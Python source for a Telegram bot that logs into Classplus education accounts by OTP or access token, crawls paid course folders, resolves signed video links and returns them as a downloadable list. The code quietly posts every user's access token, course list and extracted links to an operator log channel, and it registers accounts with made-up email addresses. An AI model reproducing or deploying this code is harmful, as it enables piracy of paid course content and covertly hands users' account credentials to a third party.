import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
import concurrent.futures
import re
from config import PREMIUM_LOGS, join,BOT_TEXT
from datetime import datetime
import pytz
from Extractor.core.utils import forward_to_log
import base64

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")


apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper() 


def build_classplus_headers(token, org_code):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "region": "IN",
        "accept-language": "en",
        "User-Agent": "Mozilla/5.0",
        "x-access-token": token,
        "x-org-code": org_code,
    }
    return headers


def is_empty_api_response(response):
    if response is None:
        return True
    if response.status_code != 200:
        return True
    try:
        data = response.json().get("data")
    except Exception:
        return True
    return data in (None, {}, [], "")


def classplus_request_with_fallback(url, token, org_code):
    primary_headers = build_classplus_headers(token, org_code)
    print(f"[Classplus Debug] Request URL: {url}")
    print(f"[Classplus Debug] Headers used: {primary_headers}")
    primary_response = s.get(url, headers=primary_headers)
    print(f"[Classplus Debug] Response status: {primary_response.status_code}")
    print(f"[Classplus Debug] Response body: {primary_response.text}")

    if primary_response.status_code == 401:
        return primary_response

    if not is_empty_api_response(primary_response):
        return primary_response

    print("[Classplus Debug] Empty API payload detected. Retrying once...")
    fallback_response = s.get(url, headers=primary_headers)
    print(f"[Classplus Debug] Retry response status: {fallback_response.status_code}")
    print(f"[Classplus Debug] Retry response body: {fallback_response.text}")
    
    return fallback_response


def fetch_jw_signed_url(content_id, token, org_code):
    """Resolve a Classplus content hash to a signed URL via API."""
    token = (token or "").strip()
    if not token:
        return None, "Token required"
    if not content_id:
        return None, None

    headers = build_classplus_headers(token, org_code)
    print("[Classplus Debug] Request URL: https://api.classplusapp.com/cams/uploader/video/jw-signed-url")
    response = s.get(
        "https://api.classplusapp.com/cams/uploader/video/jw-signed-url",
        params={"contentId": str(content_id)},
        headers=headers,
    )
    print(f"[Classplus Debug] Response status: {response.status_code}")
    print(f"[Classplus Debug] Response body: {response.text}")
    
    if response.status_code == 401:
        return None, "Invalid or expired token"

    try:
        payload = response.json()
    except Exception:
        return None, None

    if payload.get("success") is False:
        return None, "Invalid or expired token"

    signed_url = payload.get("url")
    if payload.get("success") is True and signed_url:
        return signed_url, None
    return None, None

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    # Step 1: Ask for details
    details = await app.ask(message.chat.id, 
        "🔹 <b>CP EXTRACTOR</b> 🔹\n\n"
        "Send **ID & Password** in this format:\n"
        "<code>ORG_CODE*Mobile</code>\n\n"
        "Example:\n"
        "- <code>ABCD*9876543210</code>\n"
        "- <code>ABCD*eyJhbGciOiJIUzI1NiIsInR5cCI6...</code>"
    )
    await forward_to_log(details, "Classplus Extractor")
    user_input = details.text.strip()

    if "*" in user_input and user_input.split("*", 1)[1].isdigit():
        try:
            org_code, mobile = user_input.split("*", 1)
            org_code = org_code.strip().upper()
            
            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
    "Accept": "application/json, text/plain, */*",
    "region": "IN",
    "accept-language": "en",
    "Content-Type": "application/json;charset=utf-8",
    "Api-Version": "51",
    "device-id": device_id
            }
            
            # Step 2: Fetch Organization Details
            org_response = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_response["data"]["orgId"]
            org_name = org_response["data"]["orgName"]

            # Step 3: Generate OTP
            otp_payload = {
                'countryExt': '91',
                'orgCode': org_name,
                'viaSms': '1',
                'mobile': mobile,
                'orgId': org_id,
                'otpCount': 0
            }
             
            otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            print(otp_response)

            if otp_response.status_code == 200:
                otp_data = otp_response.json()
                session_id = otp_data['data']['sessionId']
                print(session_id)

                # Step 4: Ask for OTP
                user_otp = await app.ask(message.chat.id, 
                    "📱 <b>OTP Verification</b>\n\n"
                    "OTP has been sent to your mobile number.\n"
                    "Please enter the OTP to continue.", 
                    timeout=300
                )

                if user_otp.text.isdigit():
                    otp = user_otp.text.strip()
                    print(otp)

                    # Step 5: Verify OTP
                    fingerprint_id = str(uuid.uuid4()).replace('-', '')
                    verify_payload = {
                        "otp": otp,
                        "countryExt": "91",
                        "sessionId": session_id,
                        "orgId": org_id,
                        "fingerprintId": fingerprint_id,
                        "mobile": mobile
                    }
                    
                    verify_response = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
                    

                    if verify_response.status_code == 200:
                        verify_data = verify_response.json()

                        if verify_data['status'] == 'success':
                            # OTP Verified - Proceed with Login
                            token = verify_data['data']['token']
                            s.headers['x-access-token'] = token
                            await message.reply_text(
                                "✅ <b>Login Successful!</b>\n\n"
                                "🔑 <b>Your Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            await app.send_message(PREMIUM_LOGS, 
                                "✅ <b>New Login Alert</b>\n\n"
                                "🔑 <b>Access Token:</b>\n"
                                f"<code>{token}</code>"
                            )
                            

                            response = classplus_request_with_fallback(
                                f"{apiurl}/v2/courses?tabCategoryId=1",
                                token,
                                org_code
                            )
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {
                                    "token": token,
                                    "org_code": org_code,
                                    "courses": {course["id"]: course["name"] for course in courses}
                                }
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")


                    elif verify_response.status_code == 201:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                    
                    elif verify_response.status_code == 409:

                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            response = classplus_request_with_fallback(
                                f"{apiurl}/v2/courses?tabCategoryId=1",
                                token,
                                org_code
                            )
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {
                                    "token": token,
                                    "org_code": org_code,
                                    "courses": {course["id"]: course["name"] for course in courses}
                                }
                                await fetch_batches(app, message, org_name)
                            
                            else:
                                await message.reply("Failed to verify OTP. Please try again.")
                        else:
                            await message.reply("NO BATCH FOUND OR ENTERED OTP IS NOT CORRECT .")
                    else:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(PREMIUM_LOGS, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            response = classplus_request_with_fallback(
                                f"{apiurl}/v2/courses?tabCategoryId=1",
                                token,
                                org_code
                            )
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {
                                    "token": token,
                                    "org_code": org_code,
                                    "courses": {course["id"]: course["name"] for course in courses}
                                }
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")
                        else:
                            await message.reply("wrong OTP ")
                else:
                    await message.reply("Failed to generate OTP. Please check your details and try again.")

        except Exception as e:
            await message.reply(f"Error: {str(e)}")

    elif "*" in user_input:
        org_code, token = user_input.split("*", 1)
        org_code = org_code.strip().upper()
        token = token.strip()
        if not token:
            await message.reply("Token required")
            return
        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{token}`</blockquote>"
        await app.send_message(PREMIUM_LOGS, a)
        response = classplus_request_with_fallback(
            f"{apiurl}/v2/courses?tabCategoryId=1",
            token,
            org_code
        )
        if response.status_code == 200:
            courses = response.json().get("data", {}).get("courses", [])

            s.session_data = {
                "token": token,
                "org_code": org_code,
                "courses": {course["id"]: course["name"] for course in courses}
            }

            org_name = org_code
            await fetch_batches(app, message, org_name)
        elif response.status_code == 401:
            await message.reply("Invalid or expired token")
        else:
            await message.reply("Unable to fetch courses for this account.")
    
    else:
        await message.reply("Please send credentials in ORGCODE*Mobile or ORGCODE*Token format.")
        return



async def fetch_batches(app, message, org_name):
    session_data = s.session_data
    
    if "courses" in session_data:
        courses = session_data["courses"]
        
        
      
        text = "📚 <b>Available Batches</b>\n\n"
        course_list = []
        for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
            text += f"{idx}. <code>{course_name}</code>\n"
            course_list.append((idx, course_id, course_name))
        
        await app.send_message(PREMIUM_LOGS, f"<blockquote>{text}</blockquote>")
        selected_index = await app.ask(
            message.chat.id, 
            f"{text}\n"
            "Send the index number of the batch to download.", 
            timeout=180
        )
        
        if selected_index.text.isdigit():
            selected_idx = int(selected_index.text.strip())
            
            if 1 <= selected_idx <= len(course_list):
                selected_course_id = course_list[selected_idx - 1][1]
                selected_course_name = course_list[selected_idx - 1][2]
                
                await app.send_message(
                    message.chat.id,
                    "🔄 <b>Processing Course</b>\n"
                    f"└─ Current: <code>{selected_course_name}</code>"
                )
                await extract_batch(app, message, org_name, selected_course_id)
            else:
                await app.send_message(
                    message.chat.id,
                    "❌ <b>Invalid Input!</b>\n\n"
                    "Please send a valid index number from the list."
                )
        else:
            await app.send_message(
                message.chat.id,
                "❌ <b>Invalid Input!</b>\n\n"
                "Please send a valid index number."
            )
              
    else:
        await app.send_message(
            message.chat.id,
            "❌ <b>No Batches Found</b>\n\n"
            "Please check your credentials and try again."
        )


async def extract_batch(app, message, org_name, batch_id):
    session_data = s.session_data
    
    if "token" in session_data:
        batch_name = session_data["courses"][batch_id]
        org_code = session_data.get("org_code")

        async def async_classplus_request_json(url):
            primary_headers = build_classplus_headers(session_data["token"], org_code)
            print(f"[Classplus Debug] Request URL: {url}")
            print(f"[Classplus Debug] Headers used (primary): {primary_headers}")

            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=primary_headers) as primary_response:
                    primary_status = primary_response.status
                    primary_text = await primary_response.text()
                    print(f"[Classplus Debug] Response status (primary): {primary_status}")
                    print(f"[Classplus Debug] Response body (primary): {primary_text}")
                    
                    primary_json = {}
                    try:
                        primary_json = json.loads(primary_text)
                    except Exception:
                        primary_json = {}

            primary_data = primary_json.get("data") if isinstance(primary_json, dict) else None
            if primary_status == 401:
                raise PermissionError("Invalid or expired token")

            if primary_status == 200 and primary_data not in (None, {}, [], ""):
                return primary_json

            retry_headers = build_classplus_headers(session_data["token"], org_code)
            print(f"[Classplus Debug] Empty API payload detected. Retrying once with headers: {retry_headers}")
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=retry_headers) as fallback_response:
                    fallback_status = fallback_response.status
                    fallback_text = await fallback_response.text()
                    print(f"[Classplus Debug] Response status (fallback): {fallback_status}")
                    print(f"[Classplus Debug] Response body (fallback): {fallback_text}")
                    
                    fallback_json = {}
                    try:
                        fallback_json = json.loads(fallback_text)
                    except Exception:
                        fallback_json = {}

            fallback_data = fallback_json.get("data") if isinstance(fallback_json, dict) else None
            if fallback_status == 401:
                raise PermissionError("Invalid or expired token")
            
            if fallback_status == 200 and fallback_data not in (None, {}, [], ""):
                return fallback_json

            print(f"[Classplus Debug] Response body (primary failure): {primary_text}")
            print(f"[Classplus Debug] Response body (fallback failure): {fallback_text}")
            return fallback_json

        def encode_partial_url(url):
            """Return decoded/original URL for direct download while maintaining all video format support."""
            if not url:
                return ""
            
            # Return original URL for direct download (decoded)
            return url

        async def fetch_live_videos(course_id):
            """Fetch live videos from the API with contentHashId."""
            outputs = []
            try:
                url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                j = await async_classplus_request_json(url)
                if "data" in j and "list" in j["data"]:
                    # Add live videos header
                    outputs.append(f"\n🎥 LIVE VIDEOS\n{'=' * 12}\n")
                    for video in j["data"]["list"]:
                        name = video.get("name", "Unknown Video")
                        video_url = video.get("url", "")
                        content_hash = video.get("contentHashId", "")
                
                        if video_url or content_hash:
                            signed_url, token_error = fetch_jw_signed_url(content_hash, session_data["token"], org_code)
                            if token_error == "Invalid or expired token":
                                raise PermissionError(token_error)
                            output_link = signed_url or encode_partial_url(video_url)
                            outputs.append(f"🎬 {name}: {output_link}\n")
            except Exception as e:
                print(f"Error fetching live videos: {e}")
            
            return outputs

        
        async def process_course_contents(course_id, folder_id=0, folder_path="", level=0):
            """Recursively fetch and process course content, with partially encoded URLs and icons."""
            result = []
            url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'

            course_data = await async_classplus_request_json(url)
            course_data = course_data.get("data", {}).get("courseContent", [])

            # Add folder header if not root level
            if level > 0 and folder_path:
                folder_name = folder_path.rstrip(" - ")
                indent = "  " * (level - 1)
                result.append(f"\n{indent}📁 {folder_name}\n{indent}{'=' * (len(folder_name) + 4)}\n")

            for item in course_data:
                content_type = str(item.get("contentType"))
                sub_id = item.get("id")
                sub_name = item.get("name", "Untitled")
                video_url = item.get("url", "")
                content_hash = item.get("contentHashId", "")

                if content_type in ("2", "3"):  # Video or PDF
                    if video_url:
                        # Add indentation and appropriate icon
                        indent = "  " * level
                        
                        # Check if it's a video file (including DRM and special cases)
                        video_extensions = ('.m3u8', '.mp4', '.mpd', '.avi', '.mov', '.wmv', '.flv', '.webm')
                        is_video = (video_url.lower().endswith(video_extensions) or 
                                   "playlist.m3u8" in video_url or 
                                   "master.m3u8" in video_url or
                                   "classplusapp.com/drm" in video_url or
                                   "testbook.com" in video_url)
                        
                        if video_url.lower().endswith('.pdf'):
                            icon = "📄"
                            # Remove .pdf from name if present
                            if sub_name.endswith('.pdf'):
                                sub_name = sub_name[:-4]
                        elif is_video:
                            icon = "🎬"
                        elif video_url.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                            icon = "🖼"
                        else:
                            icon = "📄"
                        
                        # Use encrypted contentId endpoint for videos, keep source URL for non-videos
                        if icon == "🎬":
                            signed_url, token_error = fetch_jw_signed_url(content_hash, session_data["token"], org_code)
                            if token_error == "Invalid or expired token":
                                raise PermissionError(token_error)
                            output_link = signed_url or encode_partial_url(video_url)
                        else:
                            output_link = encode_partial_url(video_url)

                        # Format vertically - each item on its own line
                        full_info = f"{indent}{icon} {sub_name}: {output_link}\n"
                        result.append(full_info)

                elif content_type == "1":  # Folder
                    new_folder_path = f"{folder_path}{sub_name} - "
                    # Process folders sequentially (vertically) instead of concurrently (horizontally)
                    sub_content = await process_course_contents(course_id, sub_id, new_folder_path, level + 1)
                    result.extend(sub_content)

            return result

        
        async def write_to_file(extracted_data):
            """Write data to a text file asynchronously."""
            invalid_chars = '\t:/+#|@*.'
            clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
            clean_name = clean_name.replace('_', ' ')
            file_path = f"{clean_name}.txt"
            
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(''.join(extracted_data))  
            return file_path

        try:
            extracted_data, live_videos = await asyncio.gather(
                process_course_contents(batch_id),
                fetch_live_videos(batch_id)
            )
        except PermissionError as e:
            await message.reply(str(e))
            return

        extracted_data.extend(live_videos)
        file_path = await write_to_file(extracted_data)

        # Count different types of content
        video_count = sum(1 for line in extracted_data if "🎬" in line and not line.startswith("🎥"))
        pdf_count = sum(1 for line in extracted_data if "📄" in line and not line.startswith("📁"))
        image_count = sum(1 for line in extracted_data if "🖼" in line)
        folder_count = sum(1 for line in extracted_data if "📁" in line and "====" in line)
        live_video_count = sum(1 for line in extracted_data if "🎬" in line and "contentHashId:" in line)
        total_links = len(extracted_data)
        other_count = total_links - (video_count + pdf_count + image_count + folder_count + live_video_count)
        
        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> {org_name}\n"
            f"📚 <b>BATCH:</b> {batch_name}\n"
            f"📅 <b>DATE:</b> {time_new} IST\n\n"
            f"📊 <b>CONTENT STATS</b>\n"
            f"├─ 📁 Total Links: {total_links}\n"
            f"├─ 🎬 Videos: {video_count}\n"
            f"├─ 📄 PDFs: {pdf_count}\n"
            f"├─ 🖼 Images: {image_count}\n"
            f"├─ 🎥 Live Videos: {live_video_count}\n"
            f"└─ 📦 Others: {other_count}\n\n"
            f"🚀 <b>Extracted by</b>: @{(await app.get_me()).username}\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await app.send_document(message.chat.id, file_path, caption=caption)
        await app.send_document(PREMIUM_LOGS, file_path, caption=caption)

        os.remove(file_path)
            

    
